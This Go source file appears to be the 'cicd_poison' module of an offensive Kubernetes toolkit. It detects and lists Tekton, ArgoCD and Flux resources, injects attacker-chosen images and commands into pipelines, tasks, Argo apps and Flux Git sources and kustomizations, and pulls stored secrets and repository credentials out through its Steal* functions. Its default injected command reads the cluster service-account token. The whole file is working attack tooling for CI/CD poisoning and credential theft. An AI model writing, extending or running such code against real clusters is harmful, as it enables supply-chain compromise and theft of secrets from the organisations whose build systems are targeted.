package modules

import (
	"context"
	"fmt"
	"strings"

	"github.com/yasindce1998/KubeDagger/pkg/cicd"
)

type CICDPoison struct{}

func (m *CICDPoison) Name() string      { return "cicd_poison" }
func (m *CICDPoison) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *CICDPoison) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "detect"
	}

	switch action {
	case "detect":
		return m.detect(ctx)
	case "list":
		return m.list(ctx, args)
	case "poison":
		return m.poison(ctx, args)
	case "creds":
		return m.creds(ctx, args)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *CICDPoison) detect(ctx context.Context) (*Result, error) {
	platforms, err := cicd.DetectPlatforms(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  cicd.FormatPlatforms(platforms),
	}, nil
}

func (m *CICDPoison) list(ctx context.Context, args map[string]string) (*Result, error) {
	platform := args["platform"]
	ns := args["namespace"]

	dynClient, err := cicd.GetDynamicClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	var output string
	switch platform {
	case "tekton":
		output, err = cicd.ListTektonResources(ctx, dynClient, ns)
	case "argocd":
		output, err = cicd.ListArgoApps(ctx, dynClient, ns)
	case "flux":
		output, err = cicd.ListFluxResources(ctx, dynClient, ns)
	default:
		var parts []string
		if o, e := cicd.ListTektonResources(ctx, dynClient, ns); e == nil {
			parts = append(parts, o)
		}
		if o, e := cicd.ListArgoApps(ctx, dynClient, ns); e == nil {
			parts = append(parts, o)
		}
		if o, e := cicd.ListFluxResources(ctx, dynClient, ns); e == nil {
			parts = append(parts, o)
		}
		output = strings.Join(parts, "\n")
	}

	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: true, Output: output}, nil
}

func (m *CICDPoison) poison(ctx context.Context, args map[string]string) (*Result, error) {
	platform := args["platform"]
	target := args["target"]
	ns := args["namespace"]
	image := args["image"]
	command := args["command"]

	if target == "" {
		return &Result{Success: false, Error: "target name required"}, nil
	}
	if image == "" {
		image = "alpine:latest"
	}
	if command == "" {
		command = "id && cat /var/run/secrets/kubernetes.io/serviceaccount/token"
	}

	dynClient, err := cicd.GetDynamicClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	var result *cicd.PoisonResult
	switch platform {
	case "tekton":
		resourceType := args["type"]
		if resourceType == "pipeline" {
			result, err = cicd.PoisonTektonPipeline(ctx, dynClient, ns, target, image, command)
		} else {
			result, err = cicd.PoisonTektonTask(ctx, dynClient, ns, target, image, command)
		}
	case "argocd":
		repoURL := args["repo"]
		path := args["path"]
		result, err = cicd.PoisonArgoApp(ctx, dynClient, ns, target, repoURL, path)
	case "flux":
		resourceType := args["type"]
		if resourceType == "kustomization" {
			path := args["path"]
			result, err = cicd.PoisonFluxKustomization(ctx, dynClient, ns, target, path)
		} else {
			repoURL := args["repo"]
			branch := args["branch"]
			result, err = cicd.PoisonFluxGitSource(ctx, dynClient, ns, target, repoURL, branch)
		}
	default:
		return &Result{Success: false, Error: "platform required: tekton, argocd, flux"}, nil
	}

	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: result.Success,
		Output:  result.Output,
	}, nil
}

func (m *CICDPoison) creds(ctx context.Context, args map[string]string) (*Result, error) {
	platform := args["platform"]
	ns := args["namespace"]

	client, err := cicd.GetKubeClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	dynClient, err := cicd.GetDynamicClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	var parts []string
	switch platform {
	case "tekton":
		if o, e := cicd.StealTektonSecrets(ctx, dynClient, ns); e == nil {
			parts = append(parts, o)
		}
	case "argocd":
		if o, e := cicd.StealArgoRepoCredentials(ctx, client, ns); e == nil {
			parts = append(parts, o)
		}
	case "flux":
		if o, e := cicd.StealFluxCredentials(ctx, client, ns); e == nil {
			parts = append(parts, o)
		}
	default:
		if o, e := cicd.StealTektonSecrets(ctx, dynClient, ns); e == nil {
			parts = append(parts, o)
		}
		if o, e := cicd.StealArgoRepoCredentials(ctx, client, ns); e == nil {
			parts = append(parts, o)
		}
		if o, e := cicd.StealFluxCredentials(ctx, client, ns); e == nil {
			parts = append(parts, o)
		}
	}

	return &Result{
		Success: true,
		Output:  strings.Join(parts, "\n"),
	}, nil
}
